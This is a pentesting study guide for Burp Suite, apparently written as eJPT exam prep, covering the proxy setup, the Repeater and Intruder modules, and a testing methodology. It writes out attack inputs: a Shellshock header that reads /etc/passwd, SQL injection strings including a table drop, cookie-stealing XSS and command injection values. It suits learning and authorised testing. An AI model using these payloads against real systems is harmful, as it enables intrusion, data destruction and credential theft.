# üîß Burp Suite - Web Application Security Testing

Comprehensive guide to using Burp Suite for web application penetration testing.

**Location in Framework:** `web-pentesting/burp-suite.md`

---

## üéØ What is Burp Suite?

Burp Suite is an integrated platform for web application security testing that includes:
- **Proxy** - Intercept and modify HTTP/HTTPS traffic
- **Repeater** - Manual request testing and modification
- **Intruder** - Automated attacks and fuzzing
- **Scanner** - Automated vulnerability detection (Pro only)
- **Sequencer** - Analyze randomness of tokens
- **Decoder** - Encode/decode data in various formats

---

## üöÄ Basic Setup and Configuration

### Initial Setup
1. **Start Burp Suite**
   ```bash
   # Kali Linux
   burpsuite
   
   # Or use the desktop shortcut
   ```

2. **Configure Browser Proxy**
   - Install FoxyProxy extension
   - Set proxy to `127.0.0.1:8080`
   - Import Burp CA certificate for HTTPS

### Proxy Configuration
- **Default Proxy:** 127.0.0.1:8080
- **Intercept Mode:** On/Off toggle
- **HTTP History:** View all requests/responses

---

## üîç Core Components and Usage

### 1. Proxy Module

#### Basic Interception
```
1. Enable "Intercept is on"
2. Navigate to target website
3. Modify requests in real-time
4. Forward or drop requests
```

#### HTTP History Analysis
- View all intercepted traffic
- Filter by host, status code, file extension
- Search through requests and responses
- Export interesting requests

### 2. Repeater Module

#### Manual Request Testing
```
1. Right-click request in Proxy/Target
2. Select "Send to Repeater"
3. Modify request parameters
4. Click "Send" to test
5. Analyze response
```

#### Real Lab Example (Shellshock):
**Original Request:**
```http
GET /gettime.cgi HTTP/1.1
Host: demo.ine.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)
Accept: */*
```

**Modified for Shellshock:**
```http
GET /gettime.cgi HTTP/1.1
Host: demo.ine.local
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
Accept: */*
```

---

## üß™ Practical Testing Techniques

### Header Manipulation
```http
# Original header
User-Agent: Mozilla/5.0...

# Modified for injection
User-Agent: () { :; }; echo; echo; /bin/bash -c 'whoami'
X-Forwarded-For: 127.0.0.1
Referer: javascript:alert(1)
```

### Parameter Testing
```http
# GET parameter injection
GET /search?q=test' OR 1=1--

# POST data modification
username=admin'--&password=anything
```

### Authentication Bypass
```http
# Session manipulation
Cookie: JSESSIONID=modified_session_id
Authorization: Bearer modified_jwt_token

# Header injection
X-Original-URL: /admin
X-Override-URL: /admin/panel
```

---

## üéØ Common Attack Patterns

### 1. SQL Injection Testing
```sql
-- In Repeater, modify parameters
id=1' UNION SELECT 1,2,3--
username=admin' OR '1'='1'--
search=test'; DROP TABLE users;--
```

### 2. XSS Testing
```javascript
// Reflected XSS
<script>alert('XSS')</script>
"><script>alert(document.cookie)</script>

// Event-based XSS  
<img src=x onerror=alert('XSS')>
```

### 3. Command Injection
```bash
# Parameter injection
cmd=ls; cat /etc/passwd
filename=test.txt|whoami
```

---

## üîß Advanced Features

### Intruder Module
```
1. Send request to Intruder
2. Select attack type (Sniper, Battering Ram, Pitchfork)
3. Set payload positions with ¬ß symbols
4. Configure payload sets
5. Start attack and analyze results
```

#### Attack Types:
- **Sniper** - Single payload position
- **Battering Ram** - Same payload in all positions
- **Pitchfork** - Different payloads for each position
- **Cluster Bomb** - All payload combinations

### Decoder Utilities
```
# Common encoding/decoding operations
- URL encoding/decoding
- Base64 encoding/decoding  
- HTML entity encoding
- Hex encoding/decoding
- Hash generation (MD5, SHA1, SHA256)
```

---

## üìã Testing Methodology with Burp

### 1. Reconnaissance
```
- Browse target application normally
- Map application structure via Target tab
- Identify entry points and parameters
- Note interesting functionality
```

### 2. Vulnerability Discovery
```
- Send interesting requests to Repeater
- Test each parameter for injection flaws
- Modify headers and cookies
- Test authentication and authorization
```

### 3. Exploitation
```
- Develop working exploits in Repeater
- Chain multiple vulnerabilities
- Document impact and evidence
- Create proof-of-concept demonstrations
```

---

## üéØ eJPT Exam Focus

### Essential Skills:
1. **Proxy configuration** and traffic interception
2. **Repeater usage** for manual testing
3. **Header manipulation** for various attacks
4. **Parameter modification** and injection testing
5. **Response analysis** and vulnerability confirmation

### Common Exam Scenarios:
- Shellshock exploitation via User-Agent modification
- SQL injection through form parameters
- Authentication bypass via header manipulation
- Session token analysis and modification
- File upload testing and bypass

### Key Workflows:
```
1. Intercept ‚Üí Modify ‚Üí Forward/Drop
2. Proxy ‚Üí Send to Repeater ‚Üí Test ‚Üí Analyze
3. Target ‚Üí Site Map ‚Üí Identify endpoints
4. History ‚Üí Filter ‚Üí Find interesting requests
```

---

## üõ†Ô∏è Integration with Other Tools

### Working with Command Line Tools
```bash
# Export requests from Burp
curl -H "User-Agent: malicious_payload" http://target.com/endpoint

# Import results into Burp
# Use "Paste from file" in Repeater
```

### Integration Points:
- **Export to other tools** - cURL commands, raw requests
- **Import certificates** - For HTTPS interception
- **Extensions** - Additional functionality via BApp Store
- **Collaborator** - Out-of-band interaction testing (Pro)

---

## üìù Best Practices

### Efficient Testing:
1. **Use Target scope** - Focus on relevant hosts
2. **Filter HTTP history** - Find specific request types
3. **Organize tabs** - Name Repeater tabs descriptively
4. **Save project state** - For complex assessments
5. **Document findings** - Screenshot evidence

### Performance Tips:
- Disable unnecessary interception
- Use response filtering to reduce noise
- Configure match/replace rules for automation
- Set appropriate timeouts for slow applications

---

## ‚ö†Ô∏è Common Pitfalls

### Setup Issues:
- Certificate trust problems with HTTPS
- Incorrect proxy configuration
- Browser cache interfering with testing
- Scope configuration too broad/narrow

### Testing Mistakes:
- Not testing all parameters thoroughly
- Missing hidden or unusual parameters
- Ignoring error messages and status codes
- Not following redirects properly

---

## üîó Additional Resources

### Learning Materials:
- PortSwigger Web Security Academy
- Burp Suite documentation
- OWASP Testing Guide
- Web application security labs

### Extensions to Consider:
- **Autorize** - Authorization testing
- **ActiveScan++** - Additional scan checks
- **Param Miner** - Parameter discovery
- **Turbo Intruder** - High-speed attacks
